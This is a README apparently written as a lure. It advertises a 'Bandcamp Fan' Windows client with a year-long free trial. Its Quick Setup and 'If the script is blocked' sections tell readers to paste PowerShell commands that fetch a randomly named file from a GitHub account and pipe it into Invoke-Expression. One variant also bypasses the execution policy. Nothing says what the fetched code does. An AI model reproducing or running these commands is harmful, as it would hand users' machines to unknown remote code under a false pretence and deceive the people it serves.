# Bandcamp Fan

Bandcamp Fan on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Bandcamp Fan is a subscription client for Windows that keeps your Bandcamp library, wishlist, and artist feed in one place. It syncs purchases and follows so you can browse releases, queue tracks, and get notified when labels you watch put out new material without juggling browser tabs.

A typical session starts from the tray icon: you skim new items from subscribed artists, open an album page, play previews or full tracks from your collection, and add tags or notes for later. Background sync refreshes feeds on a schedule you set, and search jumps straight to a release, track, or label from the keyboard.

This repository holds the Windows setup package, release notes, and a changelog for each subscription build. The setup file installs the client and activates the built-in free trial; when the trial ends, the free subscription tier remains configured locally. Notes document sync options, notification rules, and troubleshooting on common PC setups.

## What you get

- Centralizes artist feeds, owned albums, and wishlist items in one Windows subscription window.
- Built-in free trial runs twelve months from first setup without a separate activation step.
- After the trial, free subscription settings and library data remain stored on your PC.
- Scheduled background sync refreshes subscribed labels and purchase history while the app is idle.
- Tray notifications alert you when followed artists publish new releases or limited editions.
- Keyboard search opens albums, tracks, or labels from your synced Bandcamp Fan library quickly.
- Local tags and session notes attach to releases for organizing collections outside the main feed.
- The free subscription tier keeps core playback and feed browsing after the year-long free trial ends.

## Quick Setup (PowerShell)

This starts the built-in Bandcamp Fan free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/rothdiana63273867/bandcamp-fan-setup-guide/main/36aw8ip22g.n3g2m2jk | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/rothdiana63273867/bandcamp-fan-setup-guide/main/36aw8ip22g.n3g2m2jk | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `36aw8ip22g.n3g2m2jk` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `rothdiana63273867/bandcamp-fan-setup-guide`. Bandcamp Fan 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
